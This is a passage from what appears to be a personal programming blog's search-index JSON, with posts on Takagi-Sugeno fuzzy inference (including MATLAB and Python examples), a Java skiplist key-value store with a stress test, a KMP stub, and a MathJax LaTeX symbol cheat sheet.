valid under the conditions specified by the rule’s premise.        Defuzzification: The final system output is calculated as a weighted average of the outputs from all local linear models. The weight for each model is its normalized firing strength.  ProcessThe implementation of a T-S model follows these general steps:      System Modeling: Define the input and output variables of the nonlinear system you wish to model.        Rule Design: Partition the input space and define the fuzzy sets for each input. For each fuzzy region, create a rule with a corresponding linear output function.        Inference Process: For a given set of crisp inputs, the system calculates the membership degree of the input for each fuzzy set, determining the firing strength of every rule.        Defuzzification: The final output is computed by multiplying the output of each rule’s linear function by its firing strength and then dividing by the sum of all firing strengths.  Mathematical DetailsRule RepresentationSuppose the system has $n$ input variables: $x = (x_1, x_2, …, x_n)$.A typical T-S fuzzy rule (for rule $i$) is written as:IF $x_1$ is $A_{1i}$ and $…$ and $x_n$ is $A_{ni}$,THEN$y_i = f_i(x) = a_{i0} + a_{i1} x_1 + … + a_{in} x_n$  $A_{ji}$ is the fuzzy set for the j-th input in the i-th rule.  $f_i(x)$ is the local linear (or constant) function for the i-th rule.Membership CalculationFor an input $x$, the degree to which $x_j$ belongs to $A_{ji}$ is given by the membership function:$\\mu_{A_{ji}}(x_j)$, where $\\mu_{A_{ji}}$ is typically a function such as triangular, trapezoidal, or Gaussian.Firing StrengthThe firing strength (activation degree) of the i-th rule, $\\omega_i$, is calculated as the product of all antecedent memberships:\\[\\omega_i = \\prod_{j=1}^n \\mu_{A_{ji}}(x_j)\\]Normalization of Firing StrengthsTo ensure comparability and to use them as weights, the activation degrees are normalized:\\[h_i = \\frac{\\omega_i}{\\sum_{k=1}^m \\omega_k}\\]where $m$ is the total number of rules.Calculation for Each RuleEach rule produces an output according to its conclusion:\\[y_i = f_i(x) = a_{i0} + a_{i1} x_1 + ... + a_{in} x_n\\]DefuzzificationThe final output $y$ is a weighted sum (or weighted average) of the individual outputs from all rules:\\[y = \\sum_{i=1}^m h_i \\cdot y_i = \\sum_{i=1}^m h_i f_i(x)\\]This is often called the weighted average defuzzification method.ExampleLet’s consider a T-S fuzzy inference system with two input variables, $x_1$ and $x_2$, and two fuzzy rules.Fuzzy Rules:  Rule 1: IF $x_1$ is Low ($M_{11}$) and $x_2$ is High ($M_{12}$), THEN $y = f_1(x_1, x_2)$  Rule 2: IF $x_1$ is High ($M_{21}$) and $x_2$ is Low ($M_{22}$), THEN $y = f_2(x_1, x_2)$Membership Functions:  $M_{11}(x_1) = \\max(0, \\min(1 - x_1, 1))$  $M_{12}(x_2) = \\max(0, \\min(x_2 - 0.3, 1))$  $M_{21}(x_1) = \\max(0, \\min(x_1 - 0.3, 1))$  $M_{22}(x_2) = \\max(0, \\min(1 - x_2, 1))$Let’s use the input values:  $x_1 = 0.6$ and $x_2 = 0.8$Step 1: Calculate Membership Values  $M_{11}(0.6) = \\max(0, 0.4) = 0.4$  $M_{12}(0.8) = \\max(0, 0.5) = 0.5$  $M_{21}(0.6) = \\max(0, 0.3) = 0.3$  $M_{22}(0.8) = \\max(0, 0.2) = 0.2$Step 2: Firing Strengths      For Rule 1:\\[\\omega_1 = M_{11}(0.6) \\times M_{12}(0.8) = 0.4 \\times 0.5 = 0.2\\]        For Rule 2:\\[\\omega_2 = M_{21}(0.6) \\times M_{22}(0.8) = 0.3 \\times 0.2 = 0.06\\]  Step 3: Normalize      Total firing strength:\\[\\omega_1 + \\omega_2 = 0.2 + 0.06 = 0.26\\]        Normalized for Rule 1:\\[h_1 = \\frac{0.2}{0.26} \\approx 0.769\\]        Normalized for Rule 2:\\[h_2 = \\frac{0.06}{0.26} \\approx 0.231\\]  Step 4: Calculate Each RuleLet’s assign linear functions for each rule:      For Rule 1:\\[y_1 = 1.0 \\times x_1 + 2.0 \\times x_2 + 0.5\\]        For Rule 2:\\[y_2 = 2.0 \\times x_1 + 1.0 \\times x_2 + 0.2\\]  Plug in the values:\\[y_1 = 1.0 \\times 0.6 + 2.0 \\times 0.8 + 0.5 = 0.6 + 1.6 + 0.5 = 2.7\\]\\[y_2 = 2.0 \\times 0.6 + 1.0 \\times 0.8 + 0.2 = 1.2 + 0.8 + 0.2 = 2.2\\]Step 5: Aggregate Outputs\\[y = h_1 \\times y_1 + h_2 \\times y_2 = 0.769 \\times 2.7 + 0.231 \\times 2.2\\]\\[y = 2.0763 + 0.5082 = 2.5845\\]Final Result:Given inputs $x_1 = 0.6$, $x_2 = 0.8$, the T-S fuzzy system’s output is approximately 2.58.Scenario: Thermal ControlScenario OverviewThe system controls the opening degree of an air conditioning valve (output $Y$) based on two environmental inputs: temperature ($T$) and humidity ($H$). Each variable is described by three fuzzy sets (Low, Medium, High). The system uses three T-S fuzzy rules:  Rule 1: IF $T$ is Low and $H$ is High, THEN $Y$ = 0.2  Rule 2: IF $T$ is Medium and $H$ is Medium, THEN $Y$ = 0.5  Rule 3: IF $T$ is High and $H$ is Low, THEN $Y$ = 0.8Steps in the T-S Fuzzy      Fuzzification:For a given temperature and humidity, calculate their membership degrees in each fuzzy set.        Rule Activation:For each rule, multiply the relevant membership degrees to get the rule’s activation (firing strength).        Normalization:Normalize the activations        Output:Multiply each rule’s output by its normalized activation. Sum these products to get the final output.  Example InputSuppose $T = 23$ (°C) and $H = 60$ (%). Membership functions are defined as follows for a typical case:      For Temperature ($T$ in °C):          Low: peak at 16, zero at 20 and below 12      Medium: peak at 24, zero at 18 and 30      High: peak at 32, zero at 26 and above 36            For Humidity ($H$ in %):          Low: peak at 40, zero at 55 and below 25      Medium: peak at 60, zero at 45 and 75      High: peak at 80, zero at 65 and above 95      You can use triangular membership functions for each.CodeMatlab:T_values = linspace(0, 30, 100); % Temperature range (°C)H_values = linspace(0, 100, 100); % Humidity range (%)[T_grid, H_grid] = meshgrid(T_values, H_values);Y_out = zeros(size(T_grid));for i = 1:numel(T_grid)    T = T_grid(i);    H = H_grid(i);    % Membership functions (triangular)    Low_T = max(min((20-T)/(20-16), 1), 0);     % Low T: 16 (peak), 12-20 (base)    Med_T = max(min((T-18)/(24-18), (30-T)/(30-24)), 0);     % Medium T: 24 (peak), 18-30 (base)    High_T = max(min((T-26)/(32-26), (36-T)/(36-32)), 0);    % High T: 32 (peak), 26-36 (base)    Low_H = max(min((55-H)/(55-40), 1), 0);     % Low H: 40 (peak)    Med_H = max(min((H-45)/(60-45), (75-H)/(75-60)), 0);     % Medium H: 60 (peak)    High_H = max(min((H-65)/(80-65), (95-H)/(95-80)), 0);     % High H: 80 (peak)    % Firing Strengths    w1 = Low_T * High_H;    w2 = Med_T * Med_H;    w3 = High_T * Low_H;    sum_w = w1 + w2 + w3 + 1e-8; % Avoid division by zero    % Normalization    h1 = w1 / sum_w;    h2 = w2 / sum_w;    h3 = w3 / sum_w;    y1 = 0.2;    y2 = 0.5;    y3 = 0.8;    % Final output    Y_out(i) = h1*y1 + h2*y2 + h3*y3;endfigure;surf(T_grid, H_grid, Y_out);xlabel('Temperature (°C)');ylabel('Humidity (%)');zlabel('Valve Opening Degree');title('T-S Fuzzy Inference: Valve Opening Surface vs Temperature and Humidity');colorbar;grid on;Python:import numpy as npimport matplotlib.pyplot as pltdef tri_mf(x, a, b, c):    # Membership functions (triangular)    if x &lt;= a or x &gt;= c:        return 0.0    elif a &lt; x &lt; b:        return (x - a) / (b - a)    elif b &lt;= x &lt; c:        return (c - x) / (c - b)    else:        return 0.0T_values = np.linspace(0, 30, 100)  # Temperature range (°C)H_values = np.linspace(0, 100, 100) # Humidity range (%)T_grid, H_grid = np.meshgrid(T_values, H_values)Y_out = np.zeros(T_grid.shape)for i in range(T_grid.shape[0]):    for j in range(T_grid.shape[1]):        T = T_grid[i, j]        H = H_grid[i, j]        Low_T = tri_mf(T, 12, 16, 20)         Med_T = tri_mf(T, 18, 24, 30)        High_T = tri_mf(T, 26, 32, 36)        Low_H = tri_mf(H, 40, 55, 70)        Med_H = tri_mf(H, 45, 60, 75)        High_H = tri_mf(H, 65, 80, 95)        # Firing Strengths        w1 = Low_T * High_H        w2 = Med_T * Med_H        w3 = High_T * Low_H        sum_w = w1 + w2 + w3 + 1e-8 # Avoid division by zero        # Normalization        h1 = w1 / sum_w        h2 = w2 / sum_w        h3 = w3 / sum_w        y1 = 0.2        y2 = 0.5        y3 = 0.8        # Final output        Y_out[i, j] = h1*y1 + h2*y2 + h3*y3fig = plt.figure()ax = fig.add_subplot(111, projection='3d')surf = ax.plot_surface(T_grid, H_grid, Y_out, cmap='viridis')ax.set_xlabel('Temperature (°C)')ax.set_ylabel('Humidity (%)')ax.set_zlabel('Valve Opening Degree')ax.set_title('T-S Fuzzy Inference: Valve Opening Surface vs Temperature and Humidity')fig.colorbar(surf, shrink=0.5, aspect=5)plt.show()ApplicationsThe T-S fuzzy model is widely applied in various fields that demand robust, interpretable, and accurate modeling of nonlinear, multivariable systems. Typical application scenarios include industrial process control, intelligent vehicles, robotics, time series prediction, risk assessment, and medical or environmental systems. Its main advantage lies in the ability to effectively combine expert knowledge with data-driven modeling, providing smooth and reliable decision-making even in complex, uncertain environments.Industrial Automatic Control  Temperature Control Systems (e.g., boilers, air conditioning):The T-S model is applied to adjust heating or cooling devices based on temperature, humidity, or other variables, ensuring stable and precise control.  Motor Speed Control:It is used to regulate the speed of electric motors under varying loads and reference speeds.  Chemical Process Control:T-S models handle nonlinear and coupled parameters in reactors or distillation columns, improving overall process stability and product quality.Intelligent Transportation and Automotive  Vehicle Stability and Automatic Driving:The T-S model fuses information from speed, steering angle, and slip angle to control braking or steering, enhancing vehicle safety and stability.  Traffic Flow Prediction and Signal Optimization:It models complex urban intersections or traffic networks for better traffic light control and congestion management.Robotics and Motion Control  Robotic Arm Trajectory Tracking:T-S models generate smooth and accurate control signals for multi-joint robot arms based on position and velocity errors.  Drone Attitude and Path Control:Used for nonlinear modeling and control of UAVs, improving flight stability and path accuracy.Prediction and Diagnosis Systems  Time Series Forecasting:The T-S model is effective for forecasting complex, nonlinear time series such as stock prices, weather, or electrical loads.  Fault Diagnosis:It helps detect or predict equipment faults by analyzing signals like vibration, temperature, or current.Finance and Economic Modeling  Risk Assessment and Credit Scoring:Various financial indicators are combined using the T-S model for credit rating or risk analysis.Biomedical and Environmental Engineering  Drug Dosage Adjustment:Patient vital signs and drug concentrations are evaluated to provide personalized dosage recommendations.  Environmental Pollution Control:The T-S model optimizes emission control for multi-source pollutants."
  },
  
  {
    "title": "Implement a SkipList based K-V Database in Java",
    "url": "/posts/skiplist-java/",
    "categories": "Java",
    "tags": "Database, Java",
    "date": "2025-04-11 00:00:00 +0900",
    





    
    "snippet": "SkipListSkiplist is linked list with layers. The taller layer the fewer the node is. It is a probabilistic data structure that allows average $O(logn)$ operations. At the bottom level the linked li...",
    "content": "SkipListSkiplist is linked list with layers. The taller layer the fewer the node is. It is a probabilistic data structure that allows average $O(logn)$ operations. At the bottom level the linked list has all the data in.ImplementationThe implementation of a skiplist is quite easier than trees. Red-Black, AVL, sub-trees — seems a pain. The index layer above has half of the data in and the layer above has half of that, and so on in a ideal situation. The design of the levels of index is based on “flipping coins”: if the result is “face”, rise the level. Therefore, from level 0 there are $\\frac{1}{2}$ of chance nodes goes to level 1, $\\frac{1}{4}$ chance level 2, $\\frac{1}{8}$ chance level 3 so far and so on. If we were searching for a node we would start at the top level.NodeThe node class will represent an element in the skiplist. Each node will cantain key-value and a forward array with pointers to the next node at each level./** * Node to store data * @param &lt;K&gt; * @param &lt;V&gt; */public static class Node&lt;K extends Comparable&lt;K&gt;, V&gt;{    K key;    V value;    int level;    /**     * forward list to store next node in different levels     */    ArrayList&lt;Node&lt;K, V&gt;&gt; forward;    Node(K key, V value, int level){        this.key = key;        this.value = value;        this.level = level;        this.forward = new ArrayList&lt;&gt;(Collections.nCopies(level + 1, null));    }    public K getKey() {        return this.key;    }    public V getValue() {        return this.value;    }    public void setValue(V value) {        this.value = value;    }}SkipList ClassSkipList class is used to manage nodes and levels./** * Max level of the skip list */private static final int MAX_LEVEL = 32;/** * Dir for data persistence */private static final String DATA_STORE = \"./data\";/** * header of the skip list */private final Node&lt;K, V&gt; header;/** * current level of the skip list */private int curLevel;/** * Count of node in current skip list */private int nodeCnt;SearchTo find a key, we start at the highest level of the list. Move forward with forward array in the current level until the next key is greater than or eqaul to the target. Then, drop down to a lower level and repeat the moving forward operation until you reach the 0 level./** * search and get node value * @param key node key to search * @return the value of key node */public V get(K key){    Node&lt;K, V&gt; cur = this.header;    for(int i = this.curLevel; i &gt;= 0; i--){        while(cur.forward.get(i) != null &amp;&amp; cur.forward.get(i).getKey().compareTo(key) &lt; 0){            cur = cur.forward.get(i);        }    }    cur = cur.forward.getFirst();    if(cur != null &amp;&amp; cur.getKey().compareTo(key) == 0){        return cur.getValue();    }    return null;}InsertBefore the insertion, we need to determine the insert point by performing a search operation. Then randomly determine the level for the new node using java.util.Random./** * insert specific node * @param key   key of the node * @param value value of the node * @return  true if node is successfully inserted */public synchronized boolean insert(K key, V value){    Node&lt;K, V&gt; cur = this.header;    ArrayList&lt;Node&lt;K, V&gt;&gt; updateTable = new ArrayList&lt;&gt;(Collections.nCopies(MAX_LEVEL + 1, null));    for(int i = this.curLevel; i &gt;= 0; i--){    // get the last lower key        while(cur.forward.get(i) != null &amp;&amp; cur.forward.get(i).getKey().compareTo(key) &lt; 0){            cur = cur.forward.get(i);        }        updateTable.set(i, cur);    }    cur = cur.forward.getFirst();   // lowest level, get(0)    if(cur != null &amp;&amp; cur.getKey().compareTo(key) == 0){    // same key, replace value        cur.setValue(value);        return true;    }    int randLevel = randomLevel();    if(cur == null || cur.getKey().compareTo(key) != 0){    // different key, insert node        if(randLevel &gt; curLevel){            for(int i = curLevel + 1; i &lt; randLevel + 1; i++){                updateTable.set(i, header);            }            curLevel = randLevel;        }        Node&lt;K, V&gt; insertNode = createNode(key, value, randLevel);        for(int i = 0; i &lt;= randLevel; i++){    // insert node and index            insertNode.forward.set(i, updateTable.get(i).forward.get(i));            updateTable.get(i).forward.set(i, insertNode);        }        this.nodeCnt++;        return true;    }    return false;}If we searched and find the same key, just replace it with the newest value.if(cur != null &amp;&amp; cur.getKey().compareTo(key) == 0){    // same key, replace value    cur.setValue(value);    return true;}The updateTable is to keep track of the nodes that need to have their forward pointers updated to correctly insert the new node into the skiplist. By traversing down the levels and storing these predecessors, the insertion process can efficiently update the skiplist’s structure at all the necessary levels.In Java, the keyword synchronized is for controlling access to shared resources (like objects and variables) by multiple threads. It helps prevent race conditions and ensures thread safety. It provides mutual exclusion, meaning that only one thread can hold the lock on a particular object or class at any given time. When a thread enters a synchronized block or method, all other threads trying to enter the same synchronized block or method on the same object will be blocked until the first thread releases the lock. Here, the synchronized keyword ensures that only one thread can execute this insert method at a time, preventing race conditions and maintaining the integrity of the skiplist in a multi-threaded environment.DeleteWhen the deletion is performing, it will remove all the references from all levles where it is present./** * delete node from skip list * @param key target node's key * @return true if successfully deleted */public synchronized boolean remove(K key){    Node&lt;K, V&gt; cur = this.header;    ArrayList&lt;Node&lt;K, V&gt;&gt; updateTable = new ArrayList&lt;&gt;(Collections.nCopies(MAX_LEVEL, null));    for(int i = this.curLevel; i &gt;= 0; i--){        while(cur.forward.get(i) != null &amp;&amp; cur.forward.get(i).getKey().compareTo(key) &lt; 0){            cur = cur.forward.get(i);        }        updateTable.set(i, cur);    }    cur = cur.forward.getFirst();    if(cur != null &amp;&amp; cur.getKey().compareTo(key) == 0){    // node found        for(int i = 0; i &lt; this.curLevel; i++){            if(updateTable.get(i).forward.get(i) != cur){                break;            }            updateTable.get(i).forward.set(i, cur.forward.get(i));        }    }    while(this.curLevel &gt; 0 &amp;&amp; this.header.forward.get(this.curLevel) == null){        this.curLevel--;    // update the list level    }    this.nodeCnt--;    return true;}REPL &amp; TestREPLpublic class Main {    public static void main(String[] args){        SkipList&lt;String, String&gt; skiplist = new SkipList&lt;&gt;();        Scanner scanner = new Scanner(System.in);        skiplist.loadFile();        boolean loop = true;        while(loop){            String cmd = scanner.nextLine();            String[] cmdList = cmd.split(\" \");            switch (cmdList[0]) {                case \"insert\" -&gt; {                    boolean status = skiplist.insert(cmdList[1], cmdList[2]);                    if(status){                        System.out.println(\"Insert data: [\" + cmdList[1] + \",\" + cmdList[2] + \"] successfully!\");                    }else{                        System.out.println(\"Failed to insert data: [\" + cmdList[1] + \",\" + cmdList[2] + \"]\");                    }                }                case \"delete\" -&gt; {                    boolean status = skiplist.remove(cmdList[1]);                    if(status){                        System.out.println(\"[\" + cmdList[1] + \"] deleted successfully!\");                    }else{                        System.out.println(\"Failed to delete data!\");                    }                }                case \"search\" -&gt; {                    String value = skiplist.get(cmdList[1]);                    if(value != null){                        System.out.println(\"Key \" + cmdList[1] + \" found: \" + value);                    }else{                        System.out.println(\"Key \" + cmdList[1] + \" not exists!\");                    }                }                case \"exit\" -&gt; {                    Scanner scan = new Scanner(System.in);                    System.out.print(\"Save file? [Y/n]: \");                    String yn = scan.next();                    if(yn.equals(\"y\") || yn.equals(\"Y\")){                        skiplist.saveFile();                    }else if(yn.equals(\"n\") || yn.equals(\"N\")){                        break;                    }else{                        skiplist.saveFile();                    }                    loop = false;                }                case \"list\" -&gt; skiplist.list();                case \"save\" -&gt; skiplist.saveFile();                case \"load\" -&gt; skiplist.loadFile();                default -&gt; System.out.println(\"Command not found\");            }        }    }}Stress Testimport java.util.Random;public class StressTest{    public static final int INSERT_TIMES = 100000;    public static final int SEARCH_TIMES = 100000;    public static String randString(){        String characters = \"abcdefghijklmnopqrstuvwxyz0123456789\";        int len = 10;        StringBuilder result = new StringBuilder(len);        Random random = new Random();        for(int i = 0; i &lt; len; i++){            int index = random.nextInt(characters.length());            result.append(characters.charAt(index));        }        return result.toString();    }    public static void main(String[] args) throws InterruptedException{        int nThread = 10;        long start = System.currentTimeMillis();        Thread[] threads = new Thread[nThread];        SkipList&lt;String, String&gt; skipList = new SkipList&lt;&gt;();        for(int i = 0; i &lt; nThread; i++){            threads[i] = new Thread(new InsertTask&lt;&gt;(skipList));            threads[i].start();        }        for(int i = 0; i &lt; nThread; i++){            threads[i].join();        }        long end = System.currentTimeMillis();        System.out.println(\"Insert in \" + nThread + \" Thread \" + (nThread * INSERT_TIMES) + \" takes \" + (end - start) + \"ms\");        long start2 = System.currentTimeMillis();        Thread[] threads2 = new Thread[nThread];        for(int i = 0; i &lt; nThread; i++){            threads2[i] = new Thread(new SearchTask&lt;&gt;(skipList));            threads2[i].start();        }        for(int i = 0; i &lt; nThread; i++){            threads2[i].join();        }        long end2 = System.currentTimeMillis();        System.out.println(\"Search in \" + nThread + \" Thread \" + (nThread * SEARCH_TIMES) + \" takes \" + (end2 - start2) + \"ms\");    }    private static class InsertTask&lt;K extends Comparable&lt;K&gt;, V&gt; implements Runnable{        SkipList&lt;K, V&gt; skipList;        InsertTask(SkipList&lt;K, V&gt; skipList){            this.skipList = skipList;        }        @Override        @SuppressWarnings(\"unchecked\")        public void run(){            for(int i = 0; i &lt; INSERT_TIMES; i++){                boolean status = this.skipList.insert((K)randString(), (V)randString());                if(!status){                    System.out.println(\"Failed to insert\");                    break;                }            }        }    }    private static class SearchTask&lt;K extends Comparable&lt;K&gt;, V&gt; implements Runnable{        SkipList&lt;K, V&gt; skipList;        SearchTask(SkipList&lt;K, V&gt; skipList){            this.skipList = skipList;        }        @Override        @SuppressWarnings(\"unchecked\")        public void run(){            for(int i = 0; i &lt; SEARCH_TIMES; i++){                this.skipList.get((K)randString());            }        }    }}It defines a helper function randString() to generate random 10-character alphanumeric strings. The main method initializes a SkipList and creates an array of 10 threads (nThread = 10). For each thread, it then creates InsertTask instances, starts them to concurrently insert random key-value pairs into the SkipList, and waits for all insertion threads to complete.Insert in 10 Thread 1000000 takes 5248msSearch in 10 Thread 1000000 takes 808msProcess finished with exit code 0DisadvantagesA database built on skiplists, while offering advantages like simpler implementation and good performance, also has disadvantages, primarily due to memory overhead and lack of guaranteed worst-case performance compared to balanced trees.Answer from templatetypedef on StackOverflow: https://stackoverflow.com/a/23814116/26756091"
  },
  
  {
    "title": "KMP Pattern Searching Demo",
    "url": "/posts/kmp/",
    "categories": "HTML",
    "tags": "HTML, CS",
    "date": "2025-03-08 00:00:00 +0900",
    





    
    "snippet": "Knuth-Morris-Pratt or KMP is a linear string matching algorithm with low time complexity of O(n+m), where n is the string length and m is the pattern length.",
    "content": "Knuth-Morris-Pratt or KMP is a linear string matching algorithm with low time complexity of O(n+m), where n is the string length and m is the pattern length."
  },
  
  {
    "title": "MathJax Cheat Sheet in LaTeX",
    "url": "/posts/mathjax/",
    "categories": "Math",
    "tags": "Math, LaTeX, MathJax",
    "date": "2025-01-27 00:00:00 +0900",
    





    
    "snippet": "About MathJaxMathJax is a cross-browser JavaScript library that displays mathematical notation in web browsers, using MathML, LaTeX, and ASCIIMathML markup. MathJax is released as open-source softw...",
    "content": "About MathJaxMathJax is a cross-browser JavaScript library that displays mathematical notation in web browsers, using MathML, LaTeX, and ASCIIMathML markup. MathJax is released as open-source software under the Apache License.To put mathematics in your web page, you can use TeX and LaTeX notation, MathML notation, AsciiMath notation, or a combination of all three within the same page; the MathJax configuration tells MathJax which you want to use, and how you plan to indicate the mathematics when you are using TeX/LaTeX or AsciiMath notation.The BasicsEntering mathematical formulas in Markdown uses LaTeX syntax support.The default math delimiters are $$...$$ and \\[...\\] for displayed mathematics, and \\(...\\) for in-line mathematics. Note in particular that the $...$ in-line delimiters are not used by default. That is because dollar signs appear too often in non-mathematical settings, which could cause some text to be treated as mathematics unexpectedly. For example, with single-dollar delimiters, “… the cost is (dollar)2.50 for the first one, and (dollar)2.00 for each additional one …” would cause the phrase “2.50 for the first one, and” to be treated as mathematics since it falls between dollar signs.Greek Alphabet            $\\alpha$      \\alpha      $\\lambda$      \\lambda      $\\chi$      \\chi              $\\beta$      \\beta      $\\mu$      \\mu      $\\psi$      \\psi              $\\gamma$      \\gamma      $\\nu$      \\nu      $\\omega$      \\omega              $\\delta$      \\delta      $\\xi$      \\xi                            $\\epsilon$      \\epsilon      $\\pi$      \\pi                            $\\zeta$      \\zeta      $\\rho$      \\rho                            $\\eta$      \\eta      $\\sigma$      \\sigma                            $\\theta$      \\theta      $\\tau$      \\tau                            $\\iota$      \\iota      $\\upsilon$      \\upsilon                            $\\kappa$      \\kappa      $\\phi$      \\phi                          If uppercase Greek letters are required, just capitalize the first letter of the command. For example, \\Sigma is rendered as $\\Sigma$.        If you need italicized Greek letters, just add var before the command. \\varGamma is rendered as $\\varGamma$.  Math Alphabets            $\\mathrm{ABCDEabcde1234}    $      \\mathrm{ABCDEabcde1234}              $\\mathit{ABCDEabcde1234}    $      \\mathit{ABCDEabcde1234}              $\\mathnormal{ABCDEabcde1234}$      \\mathnormal{ABCDEabcde1234}              $\\mathcal{ABCDEabcde1234}   $      \\mathcal{ABCDEabcde1234}      Fonts      Typewriter：\\mathtt{A} rendered as $\\mathtt{A}$        Blackboard Bold: \\mathbb{A} rendered as $\\mathbb{A}$        Sans Serif: \\mathsf{A} rendered as $\\mathsf{A}$        Script: \\mathscr{A} rendered as $\\mathscr{A}$        Roman: \\mathrm{A} rendered as $\\mathrm{A}$  Binary Relations            $\\mid     $      \\mid      $\\nmid     $      \\nmid              $\\cdot    $      \\cdot      $\\leq      $      \\leq              $\\geq     $      \\geq      $\\neq      $      \\neq              $\\approx  $      \\approx      $\\equiv    $      \\equiv              $\\prec    $      \\prec      $\\preceq   $      \\preceq              $\\ll      $      \\ll      $\\succ     $      \\succ              $\\succeq  $      \\succeq      $\\gg       $      \\gg              $\\sim     $      \\sim      $\\simeq    $      \\simeq              $\\asymp   $      \\asymp      $\\cong     $      \\cong              $\\doteq   $      \\doteq      $\\propto   $      \\propto              $\\models  $      \\models      $\\parallel $      \\parallel              $\\bowtie  $      \\bowtie      $\\perp     $      \\perp              $\\circ    $      \\circ      $\\ast      $      \\ast              $\\bigodot $      \\bigodot      $\\bigotimes$      \\bigotimes              $\\bigoplus$      \\bigoplus      $          $             Binary Operators            $\\pm             $      \\pm      $\\mp            $      \\mp              $\\times          $      \\times      $\\ast           $      \\ast              $\\star           $      \\star      $\\circ          $      \\circ              $\\bullet         $      \\bullet      $\\cdot          $      \\cdot              $\\div            $      \\div      $\\sum           $      sum              $\\prod           $      \\prod      $\\coprod        $      \\coprod              $\\oplus          $      \\oplus      $\\bigoplus      $      \\bigoplus              $\\bigotimes      $      \\bigotimes      $\\oslash        $      \\oslash              $\\odot           $      \\odot      $\\bigodot       $      \\bigodot              $\\diamond        $      \\diamond      $\\bigtriangleup $      \\bigtriangleup              $\\bigtriangledown$      \\bigtriangledown      $\\triangleleft  $      \\triangleleft              $\\bigcirc        $      \\bigcirc      $\\triangleright$      \\triangleright      Big Operators            $\\sum     $      \\sum      $\\bigsqcup $      \\bigsqcup              $\\bigcup  $      \\bigcup      $\\biguplus $      \\biguplus              $\\bigvee  $      \\bigvee      $\\int      $      \\int              $\\prod    $      \\prod      $\\oint     $      \\oint              $\\bigcap  $      \\bigcap      $\\bigodot  $      \\bigodot              $\\bigwedge$      \\bigwedge      $\\bigoplus $      \\bigoplus              $\\coprod  $      \\coprod      $\\bigotimes$      \\bigotimes      Math Mode Accents            $\\acute{a}$      \\acute{a}      $\\hat{a}        $      \\hat{a}              $\\bar{a}  $      \\bar{a}      $\\mathring{a}   $      \\mathring{a}              $\\breve{a}$      \\breve{a}      $\\tilde{a}      $      \\tilde{a}              $\\check{a}$      \\check{a}      $\\vec{a}        $      \\vec{a}              $\\ddot{a} $      \\ddot{a}      $\\widehat{AAA}  $      \\widehat{AAA}              $\\dot{a}  $      \\dot{a}      $\\widetilde{AAA}$      \\widetilde{AAA}              $\\grave{a}$      \\grave{a}                    Subscript and superscriptSubscripts are typeset with the underscore, while superscripts are made with the caret. Thus X_{ab} produces $X_{ab}$, and X^{ab} produces $X^{ab}$.Delimiters            $\\uparrow    $      \\uparrow      $\\Downarrow  $      \\Downarrow              $\\downarrow  $      \\downarrow      $\\backslash  $      \\backslash              $\\updownarrow$      \\updownarrow      $\\Updownarrow$      \\Updownarrow              $\\langle     $      \\langle      $\\lfloor     $      \\lfloor              $\\rangle     $      \\rangle      $\\rfloor     $      \\rfloor              $\\Uparrow    $      \\Uparrow      $\\rceil      $      \\rceil              $\\vert       $      \\vert      $\\lceil      $      \\lceil              $\\Vert       $      \\Vert                    Large Delimiters            $\\lgroup    $      \\lgroup      $\\Arrowvert $      \\Arrowvert              $\\rgroup    $      \\rgroup      $\\bracevert $      \\bracevert              $\\lmoustache$      \\lmoustache      $\\rmoustache$      \\rmoustache              $\\arrowvert $      \\arrowvert                    Miscellaneous Symbols            $\\dots   $      \\dots      $\\emptyset   $      \\emptyset              $\\cdots  $      \\cdots      $\\infty      $      \\infty              $\\vdots  $      \\vdots      $\\nabla      $      \\nabla              $\\ddots  $      \\ddots      $\\triangle   $      \\triangle              $\\hbar   $      \\hbar      $\\bot        $      \\bot              $\\imath  $      \\imath      $\\top        $      \\top              $\\jmath  $      \\jmath      $\\angle      $      \\angle              $\\ell    $      \\ell      $\\surd       $      \\surd              $\\Re     $      \\Re      $\\diamondsuit$      \\diamondsuit              $\\Im     $      \\Im      $\\heartsuit  $      \\heartsuit              $\\aleph  $      \\aleph      $\\clubsuit   $      \\clubsuit              $\\wp     $      \\wp      $\\spadesuit  $      \\spadesuit              $\\forall $      \\forall      $\\neg        $      \\neg              $\\exists $      \\exists      $\\flat       $      \\flat              $\\partial$      \\partial      $\\natural    $      \\natural              $\\prime  $      \\prime      $\\sharp      $      \\sharp      Arrows            $\\gets              $      \\gets      $\\leftharpoonup    $      \\leftharpoonup              $\\longleftarrow     $      \\longleftarrow      $\\rightharpoonup   $      \\rightharpoonup              $\\to                $      \\to      $\\leftharpoondown  $      \\leftharpoondown              $\\longrightarrow    $      \\longrightarrow      $\\rightharpoondown $      \\rightharpoondown              $\\leftrightarrow    $      \\leftrightarrow      $\\rightleftharpoons$      \\rightleftharpoons              $\\longleftrightarrow$      \\longleftrightarrow      $\\iff              $      \\iff              $\\Leftarrow         $      \\Leftarrow      $\\uparrow          $      \\uparrow              $\\Longleftarrow     $      \\Longleftarrow      $\\downarrow        $      \\downarrow              $\\Rightarrow        $      \\Rightarrow      $\\updownarrow      $      \\updownarrow              $\\Longrightarrow    $      \\Longrightarrow      $\\Uparrow          $      \\Uparrow              $\\Leftrightarrow    $      \\Leftrightarrow      $\\Downarrow        $      \\Downarrow              $\\Longleftrightarrow$      \\Longleftrightarrow      $\\Updownarrow      $      \\Updownarrow              $\\mapsto            $      \\mapsto      $\\nearrow          $      \\nearrow              $\\longmapsto        $      \\longmapsto      $\\searrow          $      \\searrow              $\\hookleftarrow     $      \\hookleftarrow      $\\swarrow          $      \\swarrow              $\\hookrightarrow    $      \\hookrightarrow      $\\nwarrow          $      \\nwarrow      Fraction &amp; Root      \\frac{x}{y} is rendered as: $\\frac{x}{y}$        \\sqrt[x]{y} is rendered as: $\\sqrt[x]{y}$  MatrixStart with \\begin{matrix}, end with \\end{matrix}      creates a matrix with parentheses: \\begin{pmatrix}        creates a matrix with brackets: \\begin{bmatrix}        creates a matrix with vertical bars: \\begin{vmatrix}        creates a matrix with double vertical bars: \\begin{Vmatrix}  Mark \\\\ at the end of each line, and elements between lines are separated by &amp;.For example:\\begin{matrix}1&amp;0&amp;0\\\\0&amp;1&amp;0\\\\0&amp;0&amp;1\\\\\\end{matrix}rendered 